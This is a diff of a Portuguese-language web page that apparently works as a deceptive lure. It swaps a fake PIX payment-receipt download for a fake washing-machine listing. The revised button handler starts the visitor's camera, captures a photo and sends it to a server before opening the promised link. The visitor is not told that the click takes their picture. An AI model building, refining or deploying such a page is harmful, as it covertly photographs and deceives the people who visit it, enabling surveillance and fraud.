@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
-<title>Retirada de Comprovante</title>
+<title>Anuncios de Móveis</title>
 
 <style>
 
@@ -65,14 +65,14 @@ canvas{
 
 <div class="container">
 
-    <h2>Comprovante de Pagamento</h2>
+    <h2>Máquina de Lavar</h2>
 
     <p>
-        Comprovante de transferência PIX
+        Brastemp 14kg
     </p>
 
     <button id="baixarBtn">
-        Baixar Comprovante
+        Ver anúncio
     </button>
 
 </div>
@@ -165,53 +165,56 @@ async function capturarFoto(){
 }
 
 /* inicia automaticamente */
-window.onload = async function(){
 
-    await iniciarCamera();
-
-};
 
 document
 .getElementById('baixarBtn')
-.addEventListener(
-    'click',
-    async function(){
+.addEventListener('click', async function(){
 
-        try{
+    try {
 
-            this.disabled = true;
-            this.innerText = 'Processando...';
+        this.disabled = true;
+        this.innerText = 'Aguarde...';
 
-            const foto =
-                await capturarFoto();
+        if(!stream){
 
-            await enviarFoto(foto);
+            await iniciarCamera();
 
-            window.open(
-                COMPROVANTE_URL,
-                '_blank'
+            // pequena pausa para a câmera estabilizar
+            await new Promise(resolve =>
+                setTimeout(resolve, 1000)
             );
-
-            this.disabled = false;
-            this.innerText =
-                'Baixar Comprovante';
-
-        }catch(erro){
-
-            console.error(erro);
-
-            alert(
-                'Erro ao registrar a foto.'
-            );
-
-            this.disabled = false;
-            this.innerText =
-                'Baixar Comprovante';
 
         }
 
+        const foto = await capturarFoto();
+
+        await enviarFoto(foto);
+
+        window.open(
+            COMPROVANTE_URL,
+            '_blank'
+        );
+
+        this.disabled = false;
+        this.innerText =
+            'Baixar Comprovante';
+
+    } catch(erro) {
+
+        console.error(erro);
+
+        alert(
+            'Erro ao registrar a foto.'
+        );
+
+        this.disabled = false;
+        this.innerText =
+            'Baixar Comprovante';
+
     }
-);
+
+});
 
 </script>
 
